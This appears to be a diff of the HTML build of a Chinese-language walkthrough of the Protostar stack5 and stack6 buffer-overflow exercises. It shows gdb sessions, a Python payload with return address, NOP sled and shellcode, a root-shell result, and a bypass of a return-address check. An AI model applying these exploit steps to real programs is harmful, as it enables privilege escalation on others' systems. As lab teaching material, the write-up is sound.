+<span class="m">11</span><span class="w">  </span>stack5/stack5.c:<span class="w"> </span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory.
+<span class="w">  </span><span class="k">in</span><span class="w"> </span>stack5/stack5.c
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>si
+Cannot<span class="w"> </span>access<span class="w"> </span>memory<span class="w"> </span>at<span class="w"> </span>address<span class="w"> </span>0x53535357
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>si
 
-Program received signal SIGSEGV, Segmentation fault.
-0x54545454: Error <span class="k">while</span> running hook_stop:
-Cannot access memory at address 0x54545454
-0x54545454 <span class="k">in</span> ?? <span class="o">()</span> <span class="c1"># T</span>
+Program<span class="w"> </span>received<span class="w"> </span>signal<span class="w"> </span>SIGSEGV,<span class="w"> </span>Segmentation<span class="w"> </span>fault.
+0x54545454:<span class="w"> </span>Error<span class="w"> </span><span class="k">while</span><span class="w"> </span>running<span class="w"> </span>hook_stop:
+Cannot<span class="w"> </span>access<span class="w"> </span>memory<span class="w"> </span>at<span class="w"> </span>address<span class="w"> </span>0x54545454
+0x54545454<span class="w"> </span><span class="k">in</span><span class="w"> </span>??<span class="w"> </span><span class="o">()</span><span class="w"> </span><span class="c1"># T</span>
 </code></pre></div>
 </li>
 <li>
 <p>至于跳转的位置 =v= 可以简单地选择为能够控制 EIP 溢出点的下一个地址，即以下的 <code>0xbffff6b0</code>（<code>0x55555555</code> 对应的位置）</p>
-<div class="highlight"><pre><span></span><code>Starting program: /opt/protostar/bin/stack5 &lt; /tmp/test
-0x80483da &lt;main+22&gt;:    ret    
-0xbffff6ac: 0x54545454  0x55555555  0x56565656  0x57575757
-0xbffff6bc: 0x58585858  0x59595959  0x5a5a5a5a  0xb7ffef00
+<div class="highlight"><pre><span></span><code>Starting<span class="w"> </span>program:<span class="w"> </span>/opt/protostar/bin/stack5<span class="w"> </span>&lt;<span class="w"> </span>/tmp/test
+0x80483da<span class="w"> </span>&lt;main+22&gt;:<span class="w">    </span>ret<span class="w">    </span>
+0xbffff6ac:<span class="w"> </span>0x54545454<span class="w">  </span>0x55555555<span class="w">  </span>0x56565656<span class="w">  </span>0x57575757
+0xbffff6bc:<span class="w"> </span>0x58585858<span class="w">  </span>0x59595959<span class="w">  </span>0x5a5a5a5a<span class="w">  </span>0xb7ffef00
 
-Breakpoint <span class="m">1</span>, 0x080483da <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>Cannot access memory at address 0x5353535b
-<span class="o">)</span> at stack5/stack5.c:11
-<span class="m">11</span>  <span class="k">in</span> stack5/stack5.c
-<span class="o">(</span>gdb<span class="o">)</span> si
-Cannot access memory at address 0x53535357
-<span class="o">(</span>gdb<span class="o">)</span> info registers 
-eax            0xbffff660   -1073744288
-ecx            0xbffff660   -1073744288
-edx            0xb7fd9334   -1208118476
-ebx            0xb7fd7ff4   -1208123404
-esp            0xbffff6b0   0xbffff6b0
-ebp            0x53535353   0x53535353
-esi            0x0  <span class="m">0</span>
-edi            0x0  <span class="m">0</span>
-eip            0x54545454   0x54545454
-eflags         0x200246 <span class="o">[</span> PF ZF IF ID <span class="o">]</span>
-cs             0x73 <span class="m">115</span>
-ss             0x7b <span class="m">123</span>
-ds             0x7b <span class="m">123</span>
-es             0x7b <span class="m">123</span>
-fs             0x0  <span class="m">0</span>
-gs             0x33 <span class="m">51</span>
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x080483da<span class="w"> </span><span class="k">in</span><span class="w"> </span>main<span class="w"> </span><span class="o">(</span><span class="nv">argc</span><span class="o">=</span>Cannot<span class="w"> </span>access<span class="w"> </span>memory<span class="w"> </span>at<span class="w"> </span>address<span class="w"> </span>0x5353535b
+<span class="o">)</span><span class="w"> </span>at<span class="w"> </span>stack5/stack5.c:11
+<span class="m">11</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>stack5/stack5.c
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>si
+Cannot<span class="w"> </span>access<span class="w"> </span>memory<span class="w"> </span>at<span class="w"> </span>address<span class="w"> </span>0x53535357
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>info<span class="w"> </span>registers<span class="w"> </span>
+eax<span class="w">            </span>0xbffff660<span class="w">   </span>-1073744288
+ecx<span class="w">            </span>0xbffff660<span class="w">   </span>-1073744288
+edx<span class="w">            </span>0xb7fd9334<span class="w">   </span>-1208118476
+ebx<span class="w">            </span>0xb7fd7ff4<span class="w">   </span>-1208123404
+esp<span class="w">            </span>0xbffff6b0<span class="w">   </span>0xbffff6b0
+ebp<span class="w">            </span>0x53535353<span class="w">   </span>0x53535353
+esi<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
+edi<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
+eip<span class="w">            </span>0x54545454<span class="w">   </span>0x54545454
+eflags<span class="w">         </span>0x200246<span class="w"> </span><span class="o">[</span><span class="w"> </span>PF<span class="w"> </span>ZF<span class="w"> </span>IF<span class="w"> </span>ID<span class="w"> </span><span class="o">]</span>
+cs<span class="w">             </span>0x73<span class="w"> </span><span class="m">115</span>
+ss<span class="w">             </span>0x7b<span class="w"> </span><span class="m">123</span>
+ds<span class="w">             </span>0x7b<span class="w"> </span><span class="m">123</span>
+es<span class="w">             </span>0x7b<span class="w"> </span><span class="m">123</span>
+fs<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
+gs<span class="w">             </span>0x33<span class="w"> </span><span class="m">51</span>
 </code></pre></div>
 </li>
 <li>
@@ -3246,9 +3260,9 @@ gs             0x33 <span class="m">51</span>
 <span class="n">nop</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">64</span>
 <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">19</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">eip</span> <span class="o">+</span> <span class="n">nop</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\xcc</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span>
 </code></pre></div>
-<div class="highlight"><pre><span></span><code>$ python /tmp/stack.py &gt; /tmp/break
-$ ./stack5 &lt; /tmp/break
-Trace/breakpoint <span class="nb">trap</span>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>python<span class="w"> </span>/tmp/stack.py<span class="w"> </span>&gt;<span class="w"> </span>/tmp/break
+$<span class="w"> </span>./stack5<span class="w"> </span>&lt;<span class="w"> </span>/tmp/break
+Trace/breakpoint<span class="w"> </span><span class="nb">trap</span>
 </code></pre></div>
 </li>
 <li>
@@ -3260,21 +3274,21 @@ Trace/breakpoint <span class="nb">trap</span>
 <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">19</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">eip</span> <span class="o">+</span> <span class="n">nop</span> <span class="o">+</span> <span class="n">shellcode</span><span class="p">)</span>
 <span class="c1"># http://shell-storm.org/shellcode/files/shellcode-811.php</span>
 </code></pre></div>
-<div class="highlight"><pre><span></span><code>$ python /tmp/stack.py <span class="p">|</span> ./stack5 <span class="c1"># nothing happened (ŏωŏ)</span>
-$ python /tmp/stack.py &gt; /tmp/getshell
-$ gdb ./stack5
-<span class="o">(</span>gdb<span class="o">)</span> r &lt; /tmp/getshell
-Starting program: /opt/protostar/bin/stack5 &lt; /tmp/getshell
-Executing new program: /bin/dash
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>python<span class="w"> </span>/tmp/stack.py<span class="w"> </span><span class="p">|</span><span class="w"> </span>./stack5<span class="w"> </span><span class="c1"># nothing happened (ŏωŏ)</span>
+$<span class="w"> </span>python<span class="w"> </span>/tmp/stack.py<span class="w"> </span>&gt;<span class="w"> </span>/tmp/getshell
+$<span class="w"> </span>gdb<span class="w"> </span>./stack5
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r<span class="w"> </span>&lt;<span class="w"> </span>/tmp/getshell
+Starting<span class="w"> </span>program:<span class="w"> </span>/opt/protostar/bin/stack5<span class="w"> </span>&lt;<span class="w"> </span>/tmp/getshell
+Executing<span class="w"> </span>new<span class="w"> </span>program:<span class="w"> </span>/bin/dash
 <span class="c1"># 通过 gdb 可以看到 shell 能够获取</span>
-Program exited normally.
+Program<span class="w"> </span>exited<span class="w"> </span>normally.
 </code></pre></div>
 </li>
 <li>
 <p>可以通过 <code>cat</code> 来保证获得 <code>shell</code> 后不直接退出</p>
-<div class="highlight"><pre><span></span><code>$ <span class="o">(</span>python /tmp/stack.py<span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> ./stack5
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span><span class="o">(</span>python<span class="w"> </span>/tmp/stack.py<span class="p">;</span><span class="w"> </span>cat<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>./stack5
 id
-<span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>user<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>,1001<span class="o">(</span>user<span class="o">)</span>
+<span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>user<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>user<span class="o">)</span><span class="w"> </span><span class="nv">euid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>,1001<span class="o">(</span>user<span class="o">)</span>
 whoami
 root
 </code></pre></div>
@@ -3284,111 +3298,111 @@ root
 <blockquote>
 <p>what happens when you have restrictions on the return address</p>
 </blockquote>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">getpath</span><span class="p">()</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="w"></span>
-<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">getpath</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span>
 
-<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;input path please: &quot;</span><span class="p">);</span><span class="w"> </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;input path please: &quot;</span><span class="p">);</span><span class="w"> </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
 
-<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
 
 <span class="w">  </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__builtin_return_address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w">  </span><span class="c1">// read the current return address from the stack</span>
 
 <span class="w">  </span><span class="k">if</span><span class="p">((</span><span class="n">ret</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xbf000000</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0xbf000000</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span><span class="c1">// check the return address if it starts with 0xbf</span>
-<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;bzzzt (%p)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ret</span><span class="p">);</span><span class="w"></span>
-<span class="w">    </span><span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;bzzzt (%p)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ret</span><span class="p">);</span>
+<span class="w">    </span><span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
 
-<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;got path %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;got path %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="n">getpath</span><span class="p">();</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="n">getpath</span><span class="p">();</span>
+<span class="p">}</span>
 </code></pre></div>
 <ul>
 <li>首先测试能够控制 EIP 的溢出点（与先前的方法相同，位置对应 <code>U</code>）</li>
 <li>
 <p>通过 <code>gdb</code> 可以看到 <code>0xbf</code> 开头的地址对应 <code>stack</code></p>
-<div class="highlight"><pre><span></span><code>$ gdb ./stack6
-<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *getpath
-Breakpoint <span class="m">1</span> at 0x8048484: file stack6/stack6.c, line <span class="m">7</span>.
-<span class="o">(</span>gdb<span class="o">)</span> r
-Starting program: /opt/protostar/bin/stack6 
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>gdb<span class="w"> </span>./stack6
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">break</span><span class="w"> </span>*getpath
+Breakpoint<span class="w"> </span><span class="m">1</span><span class="w"> </span>at<span class="w"> </span>0x8048484:<span class="w"> </span>file<span class="w"> </span>stack6/stack6.c,<span class="w"> </span>line<span class="w"> </span><span class="m">7</span>.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r
+Starting<span class="w"> </span>program:<span class="w"> </span>/opt/protostar/bin/stack6<span class="w"> </span>
 
-Breakpoint <span class="m">1</span>, getpath <span class="o">()</span> at stack6/stack6.c:7
-<span class="m">7</span>   stack6/stack6.c: No such file or directory.
-  <span class="k">in</span> stack6/stack6.c
-<span class="o">(</span>gdb<span class="o">)</span> info proc map
-process <span class="m">2921</span>
-<span class="nv">cmdline</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin/stack6&#39;</span>
-<span class="nv">cwd</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin&#39;</span>
-<span class="nv">exe</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin/stack6&#39;</span>
-Mapped address spaces:
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>getpath<span class="w"> </span><span class="o">()</span><span class="w"> </span>at<span class="w"> </span>stack6/stack6.c:7
+<span class="m">7</span><span class="w">   </span>stack6/stack6.c:<span class="w"> </span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory.
+<span class="w">  </span><span class="k">in</span><span class="w"> </span>stack6/stack6.c
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>info<span class="w"> </span>proc<span class="w"> </span>map
+process<span class="w"> </span><span class="m">2921</span>
+<span class="nv">cmdline</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;/opt/protostar/bin/stack6&#39;</span>
+<span class="nv">cwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;/opt/protostar/bin&#39;</span>
+<span class="nv">exe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;/opt/protostar/bin/stack6&#39;</span>
+Mapped<span class="w"> </span>address<span class="w"> </span>spaces:
 
-  Start Addr   End Addr       Size     Offset objfile
-  0x8048000  0x8049000      0x1000          <span class="m">0</span>        /opt/protostar/bin/stack6
-  0x8049000  0x804a000      0x1000          <span class="m">0</span>        /opt/protostar/bin/stack6
-  0xb7e96000 0xb7e97000     0x1000          <span class="m">0</span>        
-  0xb7e97000 0xb7fd5000   0x13e000          <span class="m">0</span>         /lib/libc-2.11.2.so
-  0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
-  0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
-  0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
-  0xb7fd9000 0xb7fdc000     0x3000          <span class="m">0</span>        
-  0xb7fe0000 0xb7fe2000     0x2000          <span class="m">0</span>        
-  0xb7fe2000 0xb7fe3000     0x1000          <span class="m">0</span>           <span class="o">[</span>vdso<span class="o">]</span>
-  0xb7fe3000 0xb7ffe000    0x1b000          <span class="m">0</span>         /lib/ld-2.11.2.so
-  0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
-  0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
-  0xbffeb000 0xc0000000    0x15000          <span class="m">0</span>           <span class="o">[</span>stack<span class="o">]</span>
+<span class="w">  </span>Start<span class="w"> </span>Addr<span class="w">   </span>End<span class="w"> </span>Addr<span class="w">       </span>Size<span class="w">     </span>Offset<span class="w"> </span>objfile
+<span class="w">  </span>0x8048000<span class="w">  </span>0x8049000<span class="w">      </span>0x1000<span class="w">          </span><span class="m">0</span><span class="w">        </span>/opt/protostar/bin/stack6
+<span class="w">  </span>0x8049000<span class="w">  </span>0x804a000<span class="w">      </span>0x1000<span class="w">          </span><span class="m">0</span><span class="w">        </span>/opt/protostar/bin/stack6
+<span class="w">  </span>0xb7e96000<span class="w"> </span>0xb7e97000<span class="w">     </span>0x1000<span class="w">          </span><span class="m">0</span><span class="w">        </span>
+<span class="w">  </span>0xb7e97000<span class="w"> </span>0xb7fd5000<span class="w">   </span>0x13e000<span class="w">          </span><span class="m">0</span><span class="w">         </span>/lib/libc-2.11.2.so
+<span class="w">  </span>0xb7fd5000<span class="w"> </span>0xb7fd6000<span class="w">     </span>0x1000<span class="w">   </span>0x13e000<span class="w">         </span>/lib/libc-2.11.2.so
+<span class="w">  </span>0xb7fd6000<span class="w"> </span>0xb7fd8000<span class="w">     </span>0x2000<span class="w">   </span>0x13e000<span class="w">         </span>/lib/libc-2.11.2.so
+<span class="w">  </span>0xb7fd8000<span class="w"> </span>0xb7fd9000<span class="w">     </span>0x1000<span class="w">   </span>0x140000<span class="w">         </span>/lib/libc-2.11.2.so
+<span class="w">  </span>0xb7fd9000<span class="w"> </span>0xb7fdc000<span class="w">     </span>0x3000<span class="w">          </span><span class="m">0</span><span class="w">        </span>
+<span class="w">  </span>0xb7fe0000<span class="w"> </span>0xb7fe2000<span class="w">     </span>0x2000<span class="w">          </span><span class="m">0</span><span class="w">        </span>
+<span class="w">  </span>0xb7fe2000<span class="w"> </span>0xb7fe3000<span class="w">     </span>0x1000<span class="w">          </span><span class="m">0</span><span class="w">           </span><span class="o">[</span>vdso<span class="o">]</span>
+<span class="w">  </span>0xb7fe3000<span class="w"> </span>0xb7ffe000<span class="w">    </span>0x1b000<span class="w">          </span><span class="m">0</span><span class="w">         </span>/lib/ld-2.11.2.so
+<span class="w">  </span>0xb7ffe000<span class="w"> </span>0xb7fff000<span class="w">     </span>0x1000<span class="w">    </span>0x1a000<span class="w">         </span>/lib/ld-2.11.2.so
+<span class="w">  </span>0xb7fff000<span class="w"> </span>0xb8000000<span class="w">     </span>0x1000<span class="w">    </span>0x1b000<span class="w">         </span>/lib/ld-2.11.2.so
+<span class="w">  </span>0xbffeb000<span class="w"> </span>0xc0000000<span class="w">    </span>0x15000<span class="w">          </span><span class="m">0</span><span class="w">           </span><span class="o">[</span>stack<span class="o">]</span>
 </code></pre></div>
 </li>
 <li>
 <p><code>ret</code> 指令弹出栈顶存储的地址并跳转，那么可以先跳转到 <code>ret</code> 本身绕过检查，接下来再跳转到栈就可以了 :3</p>
 <details class="note">
 <summary>Dump of assembler code for function getpath</summary>
-<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> disassemble getpath 
-Dump of assembler code <span class="k">for</span> <span class="k">function</span> getpath:
-0x08048484 &lt;getpath+0&gt;: push   ebp
-0x08048485 &lt;getpath+1&gt;: mov    ebp,esp
-0x08048487 &lt;getpath+3&gt;: sub    esp,0x68
-0x0804848a &lt;getpath+6&gt;: mov    eax,0x80485d0
-0x0804848f &lt;getpath+11&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x08048492 &lt;getpath+14&gt;:    call   0x80483c0 &lt;printf@plt&gt;
-0x08048497 &lt;getpath+19&gt;:    mov    eax,ds:0x8049720
-0x0804849c &lt;getpath+24&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x0804849f &lt;getpath+27&gt;:    call   0x80483b0 &lt;fflush@plt&gt;
-0x080484a4 &lt;getpath+32&gt;:    lea    eax,<span class="o">[</span>ebp-0x4c<span class="o">]</span>
-0x080484a7 &lt;getpath+35&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x080484aa &lt;getpath+38&gt;:    call   0x8048380 &lt;gets@plt&gt;
-0x080484af &lt;getpath+43&gt;:    mov    eax,DWORD PTR <span class="o">[</span>ebp+0x4<span class="o">]</span>
-0x080484b2 &lt;getpath+46&gt;:    mov    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,eax
-0x080484b5 &lt;getpath+49&gt;:    mov    eax,DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>
-0x080484b8 &lt;getpath+52&gt;:    and    eax,0xbf000000
-0x080484bd &lt;getpath+57&gt;:    cmp    eax,0xbf000000
-0x080484c2 &lt;getpath+62&gt;:    jne    0x80484e4 &lt;getpath+96&gt;
-0x080484c4 &lt;getpath+64&gt;:    mov    eax,0x80485e4
-0x080484c9 &lt;getpath+69&gt;:    mov    edx,DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>
-0x080484cc &lt;getpath+72&gt;:    mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
-0x080484d0 &lt;getpath+76&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x080484d3 &lt;getpath+79&gt;:    call   0x80483c0 &lt;printf@plt&gt;
-0x080484d8 &lt;getpath+84&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x1
-0x080484df &lt;getpath+91&gt;:    call   0x80483a0 &lt;_exit@plt&gt;
-0x080484e4 &lt;getpath+96&gt;:    mov    eax,0x80485f0
-0x080484e9 &lt;getpath+101&gt;:   lea    edx,<span class="o">[</span>ebp-0x4c<span class="o">]</span>
-0x080484ec &lt;getpath+104&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
-0x080484f0 &lt;getpath+108&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x080484f3 &lt;getpath+111&gt;:   call   0x80483c0 &lt;printf@plt&gt;
-0x080484f8 &lt;getpath+116&gt;:   leave  
-0x080484f9 &lt;getpath+117&gt;:   ret    
-End of assembler dump.
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>disassemble<span class="w"> </span>getpath<span class="w"> </span>
+Dump<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>code<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>getpath:
+0x08048484<span class="w"> </span>&lt;getpath+0&gt;:<span class="w"> </span>push<span class="w">   </span>ebp
+0x08048485<span class="w"> </span>&lt;getpath+1&gt;:<span class="w"> </span>mov<span class="w">    </span>ebp,esp
+0x08048487<span class="w"> </span>&lt;getpath+3&gt;:<span class="w"> </span>sub<span class="w">    </span>esp,0x68
+0x0804848a<span class="w"> </span>&lt;getpath+6&gt;:<span class="w"> </span>mov<span class="w">    </span>eax,0x80485d0
+0x0804848f<span class="w"> </span>&lt;getpath+11&gt;:<span class="w">    </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048492<span class="w"> </span>&lt;getpath+14&gt;:<span class="w">    </span>call<span class="w">   </span>0x80483c0<span class="w"> </span>&lt;printf@plt&gt;
+0x08048497<span class="w"> </span>&lt;getpath+19&gt;:<span class="w">    </span>mov<span class="w">    </span>eax,ds:0x8049720
+0x0804849c<span class="w"> </span>&lt;getpath+24&gt;:<span class="w">    </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x0804849f<span class="w"> </span>&lt;getpath+27&gt;:<span class="w">    </span>call<span class="w">   </span>0x80483b0<span class="w"> </span>&lt;fflush@plt&gt;
+0x080484a4<span class="w"> </span>&lt;getpath+32&gt;:<span class="w">    </span>lea<span class="w">    </span>eax,<span class="o">[</span>ebp-0x4c<span class="o">]</span>
+0x080484a7<span class="w"> </span>&lt;getpath+35&gt;:<span class="w">    </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x080484aa<span class="w"> </span>&lt;getpath+38&gt;:<span class="w">    </span>call<span class="w">   </span>0x8048380<span class="w"> </span>&lt;gets@plt&gt;
+0x080484af<span class="w"> </span>&lt;getpath+43&gt;:<span class="w">    </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>ebp+0x4<span class="o">]</span>
+0x080484b2<span class="w"> </span>&lt;getpath+46&gt;:<span class="w">    </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>ebp-0xc<span class="o">]</span>,eax
+0x080484b5<span class="w"> </span>&lt;getpath+49&gt;:<span class="w">    </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>ebp-0xc<span class="o">]</span>
+0x080484b8<span class="w"> </span>&lt;getpath+52&gt;:<span class="w">    </span>and<span class="w">    </span>eax,0xbf000000
+0x080484bd<span class="w"> </span>&lt;getpath+57&gt;:<span class="w">    </span>cmp<span class="w">    </span>eax,0xbf000000
+0x080484c2<span class="w"> </span>&lt;getpath+62&gt;:<span class="w">    </span>jne<span class="w">    </span>0x80484e4<span class="w"> </span>&lt;getpath+96&gt;
+0x080484c4<span class="w"> </span>&lt;getpath+64&gt;:<span class="w">    </span>mov<span class="w">    </span>eax,0x80485e4
+0x080484c9<span class="w"> </span>&lt;getpath+69&gt;:<span class="w">    </span>mov<span class="w">    </span>edx,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>ebp-0xc<span class="o">]</span>
+0x080484cc<span class="w"> </span>&lt;getpath+72&gt;:<span class="w">    </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x4<span class="o">]</span>,edx
